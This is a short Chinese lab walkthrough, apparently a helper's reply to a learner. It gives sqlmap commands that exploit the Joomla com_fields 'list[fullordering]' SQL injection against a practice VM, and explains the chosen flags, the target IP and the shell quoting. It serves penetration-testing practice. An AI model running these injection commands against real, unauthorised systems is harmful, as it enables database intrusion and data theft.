找到漏洞利用
```bash
原文
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

利用
- `sqlmap -u "http://192.168.130.129/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p "list[fullordering]" --batch --dbs`
```
	1. 目标地址不一样
	 上面：`localhost` （意思是“我自己这台电脑”）。这是写攻略的人在他自己电脑上测试用的，你照抄，sqlmap 会去扫你的 Kali 本机，肯定扫不到东西。
     下面：`192.168.130.129` （你的靶机真实 IP）。我帮你改成了靶机的地址。
     为什么：你要打的是虚拟机，不是你的本地电脑。
    2. 探测力度不一样
     上面：带了 `--risk=3 --level=5 --random-agent`。这是最高级别的“地毯式轰炸”，测试所有可能的位置。速度极慢，而且 `risk=3` 可能会把靶机数据库搞坏。
     下面：去掉了这些。因为我们已经明确知道漏洞在 `list[fullordering]` 这个参数上，直接“精确制导”打这里就行。
     为什么：节省时间，减少出错概率。
    3. 参数引号不一样
     上面：`-p list[fullordering]` （没加引号）。
     下面：`-p "list[fullordering]"` （加了双引号）。
     为什么：你的 Kali 终端是 Zsh，中括号 `[]` 在终端里有特殊含义，不加引号终端会报错（你之前就报过 `parse error near '&'`）。加了引号，终端才会把它当成一个完整参数传给 sqlmap。
    4. 运行模式不一样
     上面：没有 `--batch`。
     下面：加了 `--batch`。
     为什么：上面跑一半可能会停下来问你 `[Y/n]`，需要你手动敲键盘。加了 `--batch`，全自动跑，不用盯着。